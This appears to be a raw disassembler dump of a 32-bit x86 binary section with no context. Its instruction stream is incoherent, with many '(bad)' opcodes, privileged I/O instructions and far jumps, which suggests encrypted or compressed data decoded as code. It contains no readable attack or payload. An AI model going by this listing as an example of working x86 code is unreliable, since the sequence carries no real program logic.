  405725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405726:	fdivp  st(1),st
  405728:	lea    edx,[eax+0x64]
  40572b:	jo     0x4056f5
  40572d:	mov    ds:0x1188c2bc,al
  405732:	dec    edi
  405733:	test   DWORD PTR [edi],edx
  405735:	mov    ds:0xf9eab557,al
  40573a:	shl    DWORD PTR [eax-0x34],0xca
  40573e:	enter  0x5b44,0x56
  405742:	pop    ebx
  405743:	lea    ebp,[eax]
  405745:	sahf   
  405746:	and    BYTE PTR [ecx+0x659e81b8],ah
  40574c:	mov    edi,0x32aa6ef7
  405751:	inc    esp
  405752:	in     eax,0x4e
  405754:	retf   
  405755:	jg     0x4057ba
  405757:	mov    esp,0xf57177b8
  40575c:	add    ch,BYTE PTR [eax+ebp*8]
  40575f:	dec    eax
  405760:	or     esp,DWORD PTR [edi+eiz*2+0x1ff310dc]
  405767:	(bad)  
  405768:	fistp  WORD PTR [eax]
  40576a:	(bad)  
  40576b:	js     0x405775
  40576d:	das    
  40576e:	cmp    eax,0x900c0e4d
  405773:	jl     0x40574a
  405775:	shl    edi,1
  405777:	jmp    0x40573d
  405779:	cmp    DWORD PTR [eax],edi
  40577b:	dec    edi
  40577c:	(bad)  
  40577d:	js     0x4057fc
  40577f:	dec    edi
  405780:	mov    al,ds:0x3816626e
  405785:	xchg   ebp,eax
  405786:	in     al,0x86
  405788:	js     0x405759
  40578a:	adc    eax,0x2503522a
  40578f:	mov    DWORD PTR [edi-0x69],0xf52e0d36
  405796:	dec    eax
  405797:	popa   
  405798:	cld    
  405799:	das    
  40579a:	icebp  
  40579b:	jp     0x405773
  40579d:	mov    ch,BYTE PTR [esi-0x4e]
  4057a0:	xor    ebp,edx
  4057a2:	into   
  4057a3:	in     al,dx
  4057a4:	adc    eax,0xbbc4a257
  4057a9:	fst    QWORD PTR [ecx+0x190ca9b0]
  4057af:	cmp    esp,DWORD PTR [ebx-0x79602600]
  4057b5:	fnstenv [ebp-0x67]
  4057b8:	test   al,0xf4
  4057ba:	mov    al,ds:0x60e1ea94
  4057bf:	fwait
  4057c0:	mov    dl,0x3e
  4057c2:	daa    
  4057c3:	push   cs
  4057c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057c5:	fiadd  WORD PTR [esi+0x11]
  4057c8:	int    0x8b
  4057ca:	gs inc edx
  4057cc:	jo     0x40578c
  4057ce:	(bad)  
  4057cf:	add    al,BYTE PTR [ebx]
  4057d1:	inc    edi
  4057d2:	xor    edi,ebx
  4057d4:	call   0x36ca4fab
  4057d9:	pushf  
  4057da:	push   esi
  4057db:	or     edx,DWORD PTR [ecx+0x3256d274]
  4057e1:	mov    ebp,0xfde5f785
  4057e6:	mov    eax,ds:0x95df5183
  4057eb:	mov    ebp,0xfd699a1a
  4057f0:	add    bh,dl
  4057f2:	mov    bl,0x25
  4057f4:	xor    al,0xea
  4057f6:	ja     0x40586c
  4057f8:	nop
  4057f9:	mov    al,ds:0x21246a3b
  4057fe:	push   ds
  4057ff:	std    
  405800:	scas   al,BYTE PTR es:[edi]
  405801:	sbb    al,0x30
  405803:	inc    ebx
  405804:	inc    edx
  405805:	(bad)  
  405806:	loope  0x40583f
  405808:	cmp    eax,0x67809ba8
  40580d:	or     eax,0xb0194517
  405812:	dec    ebx
  405813:	pop    ebx
  405814:	shl    DWORD PTR [ebp+0x2c317ccc],cl
  40581a:	cmp    eax,0xa78150bb
  40581f:	adc    al,0xfe
  405821:	mov    ecx,0xc4edc831
  405826:	push   ss
  405827:	fisttp QWORD PTR [edx+0x5]
  40582a:	cmp    edi,0x97de850a
  405830:	mov    ah,0x8
  405832:	cli    
  405833:	inc    ebp
  405834:	cmp    DWORD PTR [eax-0x51f09228],0x577bd862
  40583e:	ds inc edx
  405840:	test   dl,dh
  405842:	sahf   
  405843:	stos   BYTE PTR es:[edi],al
  405844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405845:	inc    edx
  405846:	sbb    BYTE PTR [esi-0x66ec818],0x40
  40584d:	mov    ebp,0x9249fe2d
  405852:	call   0x22ea:0xacb64c9c
  405859:	push   0xf90b19f8
  40585e:	pop    ebp
  40585f:	ror    DWORD PTR [ebx+eax*1-0x4e],cl
  405863:	xor    esp,DWORD PTR [edx+eax*4+0x46]
  405867:	inc    edi
  405868:	and    eax,DWORD PTR [ecx+ebp*1-0x51b9fa9b]
  40586f:	inc    ecx
  405870:	cmc    
  405871:	fldcw  WORD PTR [ebx]
  405873:	dec    ecx
  405874:	pop    ss
  405875:	retf   0x2256
  405878:	fwait
  405879:	mov    ds:0x60e2361a,eax
  40587e:	cmp    al,0xca
  405880:	leave  
  405881:	lahf   
  405882:	mov    ds:0xf2285fd0,eax
  405887:	sub    al,0x9a
  405889:	mov    ecx,0x8c719197
  40588e:	xchg   edx,eax
  40588f:	or     eax,0x99ed6563
  405895:	push   edx
  405896:	iret   
  405897:	or     eax,0xc64eebc2
  40589c:	cwde   
  40589d:	(bad)  [eax+0x412b6c42]
  4058a3:	mov    dh,0x67
  4058a5:	iret   
  4058a6:	push   esi
  4058a7:	sub    ah,ch
  4058a9:	mov    cl,0x15
  4058ab:	mov    dh,0x21
  4058ad:	test   DWORD PTR [ebp-0x1b],0x502fe1fd
  4058b4:	popf   
  4058b5:	inc    ebp
  4058b6:	push   ebx
  4058b7:	popf   
  4058b8:	mov    edi,0x98a20ddc
  4058bd:	inc    esi
  4058be:	adc    DWORD PTR [ebx+0x44029e0c],0x4f
  4058c5:	xchg   edx,eax
  4058c6:	retf   
  4058c7:	push   DWORD PTR [ebx-0x2]
  4058ca:	mov    gs,WORD PTR ds:0xbc614653
  4058d0:	ss sub edi,edx
  4058d3:	xchg   edx,eax
  4058d4:	inc    edi
  4058d5:	adc    al,ch
  4058d7:	pop    esi
  4058d8:	dec    ecx
  4058d9:	mov    ds:0xf2eab7ae,al
  4058de:	imul   edx,DWORD PTR [ebx+ebp*2-0xa],0xaeeffd0
  4058e6:	mov    ds,WORD PTR [edx+0x793921cc]
  4058ec:	mov    al,ds:0x9626712a
  4058f1:	mov    ah,0x82
  4058f3:	mov    eax,ds:0x69f4c248
  4058f8:	faddp  st(6),st
  4058fa:	fmul   st,st(4)
  4058fc:	lds    edi,FWORD PTR [ecx+0x7a]
  4058ff:	or     al,0xdf
  405901:	test   DWORD PTR [ebx+edx*4-0x5ba4081e],ecx
  405908:	frstor [esi-0x3bf00a4c]
  40590e:	pushf  
  40590f:	and    eax,DWORD PTR [eax]
  405911:	inc    ebx
  405912:	out    dx,eax
  405913:	mov    ds:0x54ecb827,al
  405918:	outs   dx,BYTE PTR ds:[esi]
  405919:	loop   0x4058a7
  40591b:	add    eax,0xc3dc864c
  405920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405921:	cmp    ch,BYTE PTR [ecx-0x2f787562]
  405927:	fisub  WORD PTR [edi]
  405929:	add    ecx,DWORD PTR [edx]
  40592b:	(bad)  
  40592c:	pop    edx
  40592d:	cmp    al,0xa
  40592f:	mov    dh,0x5f
  405931:	mov    ch,0xfc
  405933:	pop    es
  405934:	into   
  405935:	sti    
  405936:	retf   
  405937:	push   ebx
  405938:	pop    ss
  405939:	imul   ebx,ecx,0x9ab20145
  40593f:	dec    ebx
  405940:	sbb    esi,DWORD PTR [eax-0x70]
  405943:	stos   BYTE PTR es:[edi],al
  405944:	stc    
  405945:	rcr    BYTE PTR [ebx+0x3b],1
  405948:	or     DWORD PTR [ebx+eiz*4-0x50],eax
  40594c:	mov    edx,0x80041ee8
  405951:	pushf  
  405952:	mov    ecx,0x32319ce0
  405957:	add    bh,BYTE PTR [eax+0x7]
  40595a:	add    BYTE PTR [eax+eax*4],bh
  40595d:	enter  0xe7d0,0x8b
  405961:	mov    esp,0xe139802f
  405966:	adc    cl,bl
  405968:	pop    ebp
  405969:	pop    ds
  40596a:	jp     0x405900
  40596c:	sub    edi,DWORD PTR [eax+0x23]
  40596f:	mov    DWORD PTR [ebx-0x6182b73c],esp
  405975:	mov    ebp,0xa2f2affe
  40597a:	aaa    
  40597b:	clc    
  40597c:	imul   ebp,ebx,0x30
  40597f:	fcom   DWORD PTR ds:0x210e4b53
  405985:	jg     0x4059cb
  405987:	inc    ebp
  405988:	inc    ebp
  405989:	push   edx
  40598a:	lock bound edi,QWORD PTR [eax+eax*2-0x7ca63138]
  405992:	or     eax,0xe6e7c215
  405997:	sahf   
  405998:	ret    0x2447
  40599b:	aaa    
  40599c:	sbb    ebx,DWORD PTR [ebp-0x797eccc1]
  4059a2:	pop    esp
  4059a3:	xchg   dl,al
  4059a5:	js     0x4059a7
  4059a7:	adc    edi,ebp
  4059a9:	add    ch,BYTE PTR [esi-0x3bca4316]
  4059af:	dec    ecx
  4059b0:	aam    0x80
  4059b2:	cmp    al,0xe4
  4059b4:	jmp    0x405a2e
  4059b6:	aaa    
  4059b7:	mov    esi,0x600c0648
  4059bc:	xor    ebp,edx
  4059be:	and    esp,DWORD PTR [esp+eax*2+0x5]
  4059c2:	sub    al,0x4e
  4059c4:	mov    ebp,DWORD PTR [ebp+0x2e859683]
  4059ca:	icebp  
  4059cb:	outs   dx,BYTE PTR ds:[esi]
  4059cc:	add    al,0xe9
  4059ce:	arpl   WORD PTR [ebp+0x15],dx
  4059d1:	add    DWORD PTR [esi+eiz*1],ecx
  4059d4:	mov    esp,ss
  4059d6:	ret    0xe106
  4059d9:	mov    dh,0x18
  4059db:	aas    
  4059dc:	daa    
  4059dd:	add    al,0xd5
  4059df:	popf   
  4059e0:	sbb    eax,0x441519ec
  4059e5:	fdivr  st(7),st
  4059e7:	(bad)  
  4059e8:	or     BYTE PTR [ebx],cl
  4059ea:	shr    DWORD PTR cs:[edi],0x57
  4059ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059f0:	shl    edx,1
  4059f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059f3:	ret    0x5ffe
  4059f6:	(bad)  
  4059f7:	ja     0x405a6d
  4059f9:	nop
  4059fa:	les    ecx,FWORD PTR [edx+0x16]
  4059fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059fe:	mov    ebx,0x895c4eae
  405a03:	inc    esp
  405a04:	test   al,0xc7
  405a06:	shl    DWORD PTR [esi],0x81
  405a09:	mov    BYTE PTR [edi-0x43],0x8d
  405a0d:	xchg   ebx,eax
  405a0e:	mov    eax,ds:0x30c611d
  405a13:	lea    ebx,[ebx-0x7c]
  405a16:	sub    BYTE PTR [esi-0x52],bh
  405a19:	out    0x6c,al
  405a1b:	sbb    al,0xa9
  405a1d:	cmc    
  405a1e:	inc    esi
  405a1f:	xor    bh,BYTE PTR [eax+0x58]
  405a22:	outs   dx,BYTE PTR ds:[esi]
  405a23:	int    0x8a
  405a25:	mov    ebx,0xb02aea11
  405a2a:	jno    0x4059c1
  405a2c:	(bad)  
  405a2d:	mov    bl,0x7b
  405a2f:	add    BYTE PTR [ebx+ebx*2-0x1117a053],dh
  405a36:	je     0x4059d3
  405a38:	xchg   edi,eax
  405a39:	mov    bl,BYTE PTR [ebp-0x42884b39]
  405a3f:	adc    eax,0x96a24b16
  405a44:	popa   
  405a45:	xor    eax,0x321a433a
  405a4a:	push   cs
  405a4b:	push   edx
  405a4c:	in     eax,dx
  405a4d:	test   BYTE PTR [eax],dh
  405a4f:	and    al,0x8b
  405a51:	and    esp,DWORD PTR [ecx+esi*1+0x1c0603af]
  405a58:	push   es
  405a59:	mov    DWORD PTR [ebx],edx
  405a5b:	add    DWORD PTR [edi],esp
  405a5d:	in     al,dx
  405a5e:	mov    ?,WORD PTR [ecx]
  405a60:	in     al,dx
  405a61:	out    dx,eax
  405a62:	mov    cl,0xf3
  405a64:	mov    fs,WORD PTR [esi+0x5]
  405a67:	adc    eax,DWORD PTR [ebx+ebp*2]
  405a6a:	jb     0x405aaa
  405a6c:	(bad)  
  405a6d:	push   edx
  405a6e:	pop    edi
  405a6f:	js     0x405aec
  405a71:	popa   
  405a72:	popa   
  405a73:	xchg   BYTE PTR [esi-0x209916d8],al
  405a79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a7a:	out    0x37,eax
  405a7c:	aas    
  405a7d:	and    DWORD PTR [eax],eax
  405a7f:	inc    ebx
  405a80:	out    0x69,eax
  405a82:	cdq    
  405a83:	iret   
  405a84:	jb     0x405a1c
  405a86:	inc    ebp
  405a87:	xchg   esi,eax
  405a88:	nop
  405a89:	aam    0x4b
  405a8b:	cmp    DWORD PTR [ecx+0x6188f3b2],ebp
  405a91:	pop    ss
  405a92:	loope  0x405a1b
  405a94:	mov    dh,0xcf
  405a96:	xchg   ebp,eax
  405a97:	jo     0x405a32
  405a99:	outs   dx,BYTE PTR ds:[esi]
  405a9a:	jecxz  0x405a74
  405a9c:	sub    al,0xa
  405a9e:	std    
  405a9f:	and    ch,al
  405aa1:	popa   
  405aa2:	cmp    cl,BYTE PTR [eax]
  405aa4:	xchg   ebp,eax
  405aa5:	pop    ecx
  405aa6:	loop   0x405a30
  405aa8:	add    al,0x1e
  405aaa:	pop    ss
  405aab:	jbe    0x405a59
  405aad:	cdq    
  405aae:	dec    edi
  405aaf:	adc    eax,0x841ca4b2
  405ab4:	aas    
  405ab5:	add    DWORD PTR [ebx+0x0],eax
  405ab8:	fiadd  WORD PTR [esi+0x37]
  405abb:	inc    esi
  405abc:	ret    0xa636
  405abf:	jbe    0x405ab0
  405ac1:	cwde   
  405ac2:	rol    esp,cl
  405ac4:	repz out dx,eax
  405ac6:	sub    DWORD PTR [ecx+0x217ded1b],eax
  405acc:	ins    BYTE PTR es:[edi],dx
  405acd:	(bad)  
  405ace:	push   esi
  405acf:	mov    gs,WORD PTR [ebx]
  405ad1:	idiv   DWORD PTR [ebp+0x6d]
  405ad4:	inc    eax
  405ad5:	stc    
  405ad6:	int    0xf0
  405ad8:	shl    DWORD PTR [ecx],cl
  405ada:	adc    cl,bh
  405adc:	retf   
  405add:	in     eax,dx
  405ade:	mov    ah,0xc5
  405ae0:	push   ds
  405ae1:	pop    edi
  405ae2:	push   eax
  405ae3:	push   ebp
  405ae4:	or     BYTE PTR [ebx+0x291c9cc4],ch
  405aea:	test   al,0x20
  405aec:	addr16 ret 0x7085
  405af0:	push   0x6d
  405af2:	mov    ch,0x85
  405af4:	mov    ecx,0xb2f4d31b
  405af9:	pop    edx
  405afa:	push   ecx
  405afb:	cwde   
  405afc:	lea    edx,[ebx]
  405afe:	xchg   edx,eax
  405aff:	and    eax,0xfbb501a8
  405b04:	ficom  WORD PTR [ebp-0x18e28e64]
  405b0a:	or     al,ch
  405b0c:	cdq    
  405b0d:	inc    esi
  405b0e:	and    esi,edx
  405b10:	push   0xe271d411
  405b15:	xchg   BYTE PTR [ebx],dh
  405b17:	sub    eax,0xc7d76b40
  405b1c:	adc    BYTE PTR [ecx],dh
  405b1e:	dec    esp
  405b1f:	add    al,0x32
  405b21:	fistp  DWORD PTR [ebp+0x63602df1]
  405b27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b28:	pop    edx
  405b29:	outs   dx,DWORD PTR ds:[esi]
  405b2a:	inc    ebp
  405b2b:	leave  
  405b2c:	inc    esi
  405b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b2e:	sub    eax,0x8b2831e4
  405b33:	lds    ebx,FWORD PTR [ecx+0x43]
  405b36:	icebp  
  405b37:	xchg   DWORD PTR [edx-0x36],edx
  405b3a:	sub    al,0x29
  405b3c:	add    BYTE PTR [esi+0x5a],dl
  405b3f:	push   ds
  405b40:	cli    
  405b41:	xor    eax,0x767496e5
  405b46:	and    al,0x4b
  405b48:	xchg   edx,eax
  405b49:	xor    al,0xf
  405b4b:	cld    
  405b4c:	mov    esp,0xda755ece
  405b51:	sub    al,0x94
  405b53:	jle    0x405ad7
  405b55:	fwait
  405b56:	addr16 push cs
  405b58:	nop
  405b59:	xchg   ebp,eax
  405b5a:	jl     0x405b66
  405b5c:	or     ebx,DWORD PTR [ebp-0x745e2f94]
  405b62:	aam    0x53
  405b64:	xchg   edx,eax
  405b65:	jnp    0x405bc4
  405b67:	leave  
  405b68:	nop
  405b69:	out    0x9b,eax
  405b6b:	call   0x471c84a3
  405b70:	xchg   edi,eax
  405b71:	mov    cl,0xbb
  405b73:	ficomp DWORD PTR es:[ebp-0x654cdcc1]
  405b7a:	cwde   
  405b7b:	xor    bl,BYTE PTR [esi+esi*8+0x337465fa]
  405b82:	jnp    0x405b4f
  405b84:	jnp    0x405b6a
  405b86:	test   BYTE PTR [eax-0x1],ch
  405b89:	push   edi
  405b8a:	std    
  405b8b:	add    esi,DWORD PTR [edx]
  405b8d:	(bad)  
  405b8e:	dec    ebp
  405b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b90:	ss or  al,0xd4
  405b93:	fsub   QWORD PTR [ecx-0x13]
  405b96:	inc    ebp
  405b97:	cs dec esp
  405b99:	shl    DWORD PTR [esi],cl
  405b9b:	bound  ecx,QWORD PTR [edi-0x20309d8c]
  405ba1:	dec    ebp
  405ba2:	sbb    BYTE PTR [esi+edx*4+0x4a],ch
  405ba6:	sub    cl,BYTE PTR cs:[ecx]
  405ba9:	in     eax,dx
  405baa:	aam    0x73
  405bac:	xor    ebp,DWORD PTR [ebx-0xf]
  405baf:	fist   DWORD PTR [esi]
  405bb1:	int    0x6d
  405bb3:	mov    dl,0x96
  405bb5:	mov    ecx,DWORD PTR [ecx+0x5]
  405bb8:	xor    dl,BYTE PTR [edx-0x16]
  405bbb:	dec    esi
  405bbc:	aad    0x5c
  405bbe:	adc    DWORD PTR [ecx+ebx*2+0x63aa79a1],esi
  405bc5:	loop   0x405bd8
  405bc7:	add    al,cl
  405bc9:	inc    eax
  405bca:	pop    esp
  405bcb:	adc    esi,DWORD PTR [ebx+ebp*1+0x7fd583c7]
  405bd2:	push   0xffffffcb
  405bd4:	adc    al,BYTE PTR [edx-0x4cf60c3b]
  405bda:	in     eax,dx
  405bdb:	xchg   ebx,eax
  405bdc:	push   cs
  405bdd:	ja     0x405b77
  405bdf:	aas    
  405be0:	or     eax,0x15c03d8f
  405be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405be6:	sub    DWORD PTR [edi-0x6c2968cb],ebx
  405bec:	mov    al,ds:0x491f37ea
  405bf1:	mov    eax,ds:0xb13cd7ee
  405bf6:	lock rcr eax,1
  405bf9:	out    0x7b,eax
  405bfb:	inc    edi
  405bfc:	sub    dl,dh
  405bfe:	pop    ebx
  405bff:	or     dl,BYTE PTR [ebx]
  405c01:	test   eax,0x182f6673
  405c06:	xor    ebx,ebp
  405c08:	loop   0x405bb9
  405c0a:	jmp    DWORD PTR [ebp+0x21]
  405c0d:	pop    ss
  405c0e:	pop    edx
  405c0f:	ss out 0x71,al
  405c12:	jmp    0x22555959
  405c17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c18:	xor    DWORD PTR [ebx-0x5812cd02],edi
  405c1e:	cmp    BYTE PTR [edi-0x16],cl
  405c21:	cmp    eax,0x247ca709
  405c26:	shl    BYTE PTR [esi-0x23],1
  405c29:	jmp    0x405c09
  405c2b:	lods   eax,DWORD PTR ds:[esi]
  405c2c:	push   edx
  405c2d:	mov    edx,DWORD PTR [ebp+0x2d]
  405c30:	out    0x31,al
  405c32:	clc    
  405c33:	ret    0xbf1d
  405c36:	and    DWORD PTR [ebx+0x37],edx
  405c39:	mov    ebx,0x50c31d37
  405c3e:	mov    dl,0x2c
  405c40:	fs jge 0x405bfb
  405c43:	jo     0x405bcf
  405c45:	retf   0xb7ec
  405c48:	sbb    cl,cl
  405c4a:	pop    edx
  405c4b:	in     eax,0x92
  405c4d:	sub    eax,0xe7bd76b8
  405c52:	loopne 0x405c1d
  405c54:	xchg   ebp,eax
  405c55:	imul   ebx,DWORD PTR [ebx],0xd9d4939f
  405c5b:	les    ecx,FWORD PTR [edi]
  405c5d:	enter  0x6c6a,0x77
  405c61:	jmp    0x405bf5
  405c63:	pop    ecx
  405c64:	and    BYTE PTR [esi-0x60],ch
  405c67:	mov    dl,0xa5
  405c69:	adc    BYTE PTR [eax],bl
  405c6b:	push   cs
  405c6c:	int3   
  405c6d:	add    BYTE PTR [ebx+eax*4],ch
  405c70:	les    ebx,FWORD PTR [eax+0x1d1fd915]
  405c76:	loop   0x405c1a
  405c78:	jnp    0x405cbc
  405c7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c7b:	call   0x35807ddf
  405c80:	mov    esp,0xc68da3c7
  405c85:	mov    esp,0x549b7165
  405c8a:	push   edi
  405c8b:	mov    al,0x2c
  405c8d:	jge    0x405c15
  405c8f:	adc    ebx,edx
  405c91:	sub    eax,0x5c0f0cf4
  405c96:	dec    esp
  405c97:	push   esp
  405c98:	mov    WORD PTR [edx+0x7d],?
  405c9b:	cmc    
  405c9c:	rcr    ch,0xfd
  405c9f:	pushf  
  405ca0:	pop    ss
  405ca1:	bound  eax,QWORD PTR [eax+0x71e5cb1c]
  405ca7:	icebp  
  405ca8:	inc    ebp
  405ca9:	sbb    al,0xc5
  405cab:	gs aad 0x7
  405cae:	dec    edx
  405caf:	xor    dh,bh
  405cb1:	mov    cl,0x50
  405cb3:	xlat   BYTE PTR ds:[ebx]
  405cb4:	sbb    BYTE PTR [ebx+0x58],dl
  405cb7:	dec    edi
  405cb8:	jb     0x405c7a
  405cba:	sti    
  405cbb:	inc    ebx
  405cbc:	cmp    BYTE PTR [ecx+ebp*2],bl
  405cbf:	mov    cl,0xe8
  405cc1:	retf   
  405cc2:	xlat   BYTE PTR ds:[ebx]
  405cc3:	loop   0x405c9c
  405cc5:	pop    ebp
  405cc6:	aam    0xfd
  405cc8:	retf   
  405cc9:	jno    0x405cbe
  405ccb:	imul   edx,edx,0x10
  405cce:	sbb    ebp,0x317b0968
  405cd4:	mov    esp,0x3bf708af
  405cd9:	fld    DWORD PTR [ebp-0x43e1a3b3]
  405cdf:	fcmovbe st,st(0)
  405ce1:	dec    ebp
  405ce2:	shr    DWORD PTR [eax+0x2013b5c2],1
  405ce8:	mov    ?,WORD PTR [esi]
  405cea:	imul   esi,DWORD PTR [esi+0x75599d9],0x2003da06
  405cf4:	imul   ebp,esp,0xbdcba4d
  405cfa:	arpl   si,dx
  405cfc:	add    DWORD PTR ds:0x6df9e296,ebx
  405d02:	pop    ds
  405d03:	call   0x172d200c
  405d08:	xchg   edi,eax
  405d09:	sar    DWORD PTR [ebp+0x2e],cl
  405d0c:	inc    ebx
  405d0d:	es out dx,eax
  405d0f:	mov    edi,0x5fd73c0
  405d14:	pop    es
  405d15:	sub    ebx,eax
  405d17:	out    dx,eax
  405d18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d19:	jle    0x405d41
  405d1b:	mov    dl,0xaa
  405d1d:	cmp    al,BYTE PTR [eax]
  405d1f:	sar    DWORD PTR [edi],cl
  405d21:	pop    esp
  405d22:	mov    dl,0x4c
  405d24:	xchg   edx,eax
  405d25:	dec    ebx
  405d26:	test   al,0x61
  405d28:	loop   0x405d15
  405d2a:	fucomi st,st(4)
  405d2c:	inc    esi
  405d2d:	data16 hlt 
  405d2f:	jae    0x405cde
  405d31:	stos   BYTE PTR es:[edi],al
  405d32:	cs (bad) 
  405d34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d35:	xor    eax,0xb1b3f36
  405d3a:	and    eax,0x8b28f298
  405d3f:	mov    ds:0x333035e7,al
  405d44:	push   eax
  405d45:	leave  
  405d46:	pop    ss
  405d47:	ror    dh,0xb
  405d4a:	out    dx,al
  405d4b:	call   0xda9627fa
  405d50:	mov    ds:0xd116d5ce,eax
  405d55:	inc    esi
  405d56:	or     BYTE PTR [esi],0xdf
  405d59:	pop    edx
  405d5a:	mov    ch,0xad
  405d5c:	cli    
  405d5d:	adc    al,0xf5
  405d5f:	mov    eax,ds:0x7a0cad34
  405d64:	jbe    0x405d57
  405d66:	ins    DWORD PTR es:[edi],dx
  405d67:	inc    ebp
  405d68:	packsswb mm3,QWORD PTR [edx]
  405d6b:	xor    al,ch
  405d6d:	mov    al,0xee
  405d6f:	push   ss
  405d70:	(bad)  
  405d71:	aad    0xa
  405d73:	mov    edx,0x24a50189
  405d78:	call   0x9a31:0x53e79201
  405d7f:	data16 fwait
  405d81:	pop    ebx
  405d82:	jle    0x405d28
  405d84:	pop    ebp
  405d85:	sub    cl,BYTE PTR [ebx]
  405d87:	ss pop edx
  405d89:	jo     0x405d4f
  405d8b:	jmp    0x75a4:0xb2115173
  405d92:	inc    ecx
  405d93:	pop    ds
  405d94:	outs   dx,DWORD PTR ds:[esi]
  405d95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d96:	xchg   edx,eax
  405d97:	aad    0x1
  405d99:	xor    eax,0xbf1dd9f4
  405d9e:	lea    esp,[edx]
  405da0:	cdq    
  405da1:	mov    esi,0x5e60bfc9
  405da6:	xchg   edx,eax
  405da7:	cwde   
  405da8:	mov    cl,0x50
  405daa:	jecxz  0x405d47
  405dac:	in     al,0xa8
  405dae:	push   edx
  405daf:	arpl   WORD PTR [edx+0x27],di
  405db2:	or     bh,bh
  405db4:	jp     0x405e2a
  405db6:	mov    esp,0xf1e975dc
  405dbb:	test   al,0x4b
  405dbd:	jmp    0x230e23
  405dc2:	cwde   
  405dc3:	mov    ecx,0x50b6a1d4
  405dc8:	jnp    0x405d5c
  405dca:	push   0x20
  405dcc:	xchg   ebx,eax
  405dcd:	push   ecx
  405dce:	inc    ebp
  405dcf:	aad    0x31
  405dd1:	sbb    BYTE PTR [eax+0x6e],al
  405dd4:	popf   
  405dd5:	add    esi,DWORD PTR [edx+esi*2]
  405dd8:	jl     0x405dde
  405dda:	sahf   
  405ddb:	sub    BYTE PTR [edi],cl
  405ddd:	(bad)  
  405dde:	xchg   ebx,eax
  405ddf:	(bad)  
  405de0:	cmp    bh,ah
  405de2:	mov    edx,DWORD PTR [edx]
  405de4:	xor    al,0xed
  405de6:	xchg   ebp,eax
  405de7:	xor    ebx,edi
  405de9:	(bad)  
  405deb:	inc    edx
  405dec:	outs   dx,BYTE PTR ds:[esi]
  405ded:	sti    
  405dee:	xchg   BYTE PTR ds:0xb067e85,cl
  405df4:	shl    BYTE PTR [edx+0x2449d6d5],1
  405dfa:	cmp    DWORD PTR [eax+0x4f],0x4b
  405dfe:	scas   eax,DWORD PTR es:[edi]
  405dff:	mov    ah,0xcd
  405e01:	inc    ecx
  405e02:	mov    ebp,0x273f6b5b
  405e07:	rol    BYTE PTR [ebx],cl
  405e09:	jb     0x405e6a
  405e0b:	jnp    0x405e25
  405e0d:	aas    
  405e0e:	pusha  
  405e0f:	call   0xfe4:0xc0e581e1
  405e16:	cmp    DWORD PTR [esi-0x525d2143],ebp
  405e1c:	xchg   esp,eax
  405e1d:	push   edx
  405e1e:	adc    esi,ebp
  405e20:	sar    BYTE PTR es:[edx+0x41aed84f],0x69
  405e28:	call   0xd5e7:0xfb9bfea6
  405e2f:	mov    ?,WORD PTR [ebx]
  405e31:	ins    DWORD PTR es:[edi],dx
  405e32:	or     DWORD PTR [edi],esi
  405e34:	repnz test DWORD PTR [ecx-0x6e],ebx
  405e38:	pop    edi
  405e39:	push   cs
  405e3a:	bnd jbe 0x405df9
  405e3d:	ret    
  405e3e:	fidivr DWORD PTR [ebp+0x42]
  405e41:	mov    ebx,0xc6933f17
  405e46:	sbb    ecx,edx
  405e48:	pop    ebx
  405e49:	cli    
  405e4a:	or     BYTE PTR [edx-0x2b],ch
  405e4d:	pop    es
  405e4e:	and    ebx,eax
  405e50:	mov    edi,0x8aa908c0
  405e55:	jb     0x405ea4
  405e57:	imul   DWORD PTR [edi+0x71f4a392]
  405e5d:	and    BYTE PTR [eax+0x2e307df8],cl
  405e63:	add    cl,cl
  405e65:	lock nop
  405e67:	mov    cl,0x4d
  405e69:	xor    al,0xe9
  405e6b:	(bad)  
  405e6c:	fld    DWORD PTR [ebx+ebp*4+0x26]
  405e70:	in     eax,dx
  405e71:	cli    
  405e72:	sbb    DWORD PTR [eax-0x48],ecx
  405e75:	(bad)  
  405e76:	je     0x405ed3
  405e78:	(bad)  
  405e79:	popa   
  405e7a:	jnp    0x405e88
  405e7c:	add    BYTE PTR [ecx],bh
  405e7e:	jmp    0x582dff03
  405e83:	jge    0x405e7d
  405e85:	mov    ch,0x9
  405e87:	(bad)  
  405e88:	sti    
  405e89:	sar    BYTE PTR [ecx+0x224165d8],0x8d
  405e90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e91:	bound  esi,QWORD PTR es:[ecx+ebx*1+0x28]
  405e96:	sbb    bh,BYTE PTR [esi-0x452ab408]
  405e9c:	pop    esi
  405e9d:	sbb    BYTE PTR [ebx],dh
  405e9f:	pushf  
  405ea0:	je     0x405efd
  405ea2:	int    0xbe
  405ea4:	jnp    0x405e71
  405ea6:	or     bl,bh
  405ea8:	sbb    BYTE PTR [eax-0x3db29322],ch
  405eae:	mov    edx,0xdffb3552
  405eb3:	mov    ds:0xe668c33a,al
  405eb8:	es pop ebx
  405eba:	je     0x405e61
  405ebc:	jns    0x405ee5
  405ebe:	stc    
  405ebf:	pop    ds
  405ec0:	mov    DWORD PTR [eax],esi
  405ec2:	sbb    eax,0xfc152cd
  405ec7:	stc    
  405ec8:	or     DWORD PTR [ebx+0x20],esi
  405ecb:	mov    ch,0x5f
  405ecd:	outs   dx,BYTE PTR ds:[esi]
  405ece:	push   ecx
  405ecf:	sub    eax,0x366522ad
